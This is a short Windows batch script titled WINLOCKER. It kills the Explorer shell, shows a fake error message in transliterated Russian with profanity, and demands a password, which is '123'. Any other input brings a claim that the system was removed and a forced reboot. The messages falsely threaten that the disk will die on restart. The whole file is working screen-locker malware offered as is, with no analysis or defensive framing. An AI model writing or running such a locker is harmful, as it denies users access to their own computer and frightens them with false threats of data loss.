@echo off
Taskkill/f /im explorer.exe
Title WINLOCKER
color 5


echo error
echo Technical Information:

echo PAROL DAVAI LIBO PIZDA KOMPY
echo PRI PEREZAPYSKE - DISK YMPET

:h
set/p x=
if %x%==123 (echo win start
start explorer
exit
) else (
echo Your sistem was be removed!
shutdown /r
)
goto h